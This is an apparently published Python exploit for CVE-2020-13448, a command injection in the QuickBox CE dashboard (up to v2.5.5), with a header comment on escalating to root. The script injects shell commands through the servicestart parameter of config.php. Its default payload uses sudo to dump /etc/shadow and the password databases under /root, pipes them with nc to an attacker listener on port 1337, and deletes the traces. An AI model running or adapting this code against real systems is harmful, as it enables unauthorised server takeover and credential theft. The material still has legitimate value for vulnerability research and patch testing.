# Exploit Title: QuickBox CE <= v2.5.5 Authenticated Remote Code Execution
# Date: 2020-05-24
# Exploit Author: s1gh
# Vendor Homepage: https://quickbox.io/
# Vulnerability Details: https://s1gh.sh/cve-2020-13448-quickbox-authenticated-rce/
# Software Link: https://github.com/QuickBox/QB/archive/v2.5.5.zip
# Version: <= 2.5.5
# Description: An authenticated low-privileged user can exploit a command injection vulnerability to get code-execution as www-data and escalate privileges to root due to weak sudo rules.
# Tested on: Ubuntu 16.04
# CVE: CVE-2020-13448

'''
Privilege escalation: After dumping the cleartext passwords of all the users, one of these credentials is the admin credential.
You can look at /etc/passwd to determine what user was created first on the box - this is most likely the admin user.
When you SSH in as this user/change to this user, you can simply run 'sudo su' in order to escalate to root.
'''

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
import socket
from threading import Thread
from requests.auth import HTTPDigestAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote_plus

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def listener(lhost):
    print('[*] Starting listener on port 1337 for incoming response...')
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((lhost, 1337))
        s.listen()
        conn, addr = s.accept()
        with conn:
            data = conn.recv(4096)
            if 'root' in data.decode():
                print('[*] Got a response!\n')
                print(data.decode())
            conn.close()

def exploit(args):
    print('[*] Injecting our command into shell_exec...')
    s = requests.Session()
    try:
        s.get('https://' + args.ip + '/inc/config.php?id=88&servicestart=a;' + quote_plus(args.cmd.format(args.lhost)) + ';', auth=HTTPDigestAuth(args.username,args.password), verify=False, timeout=2)
    except requests.exceptions.ReadTimeout:
        pass

def main():
    parser = argparse.ArgumentParser(description="Authenticated RCE for QuickBox CE <= v2.5.5")
    parser.add_argument('-i',dest='ip',required=True,help="IP address of the QuickBox dashboard")
    parser.add_argument('-u',dest='username',required=True,help="Username")
    parser.add_argument('-p',dest='password',required=True,help="Password")
    parser.add_argument('-l',dest='lhost',required=False,help="IP address to receive data on (if not using own listener)")
    parser.add_argument('-c',dest='cmd',default='sudo grep . /etc/shadow > pwds;echo "\n" >> pwds;sudo grep -R . /root/ --include="*.db" >> pwds;nc {} 1337<pwds;rm pwds',help="Command to execute. Default is to dump /etc/shadow and cleartext passwords")


    if len(sys.argv)<3:
    	parser.print_help()
    	sys.exit(0)

    args = parser.parse_args()

    if 'pwds' in args.cmd and (args.lhost is None):
        parser.error("Default command (dump /etc/shadow) requires -l")

    if 'pwds' in args.cmd:
        l = Thread(target=listener,args=(args.lhost,))
        l.start()

    exploit(args)


if __name__ == '__main__':
    main()
    sys.exit(0)
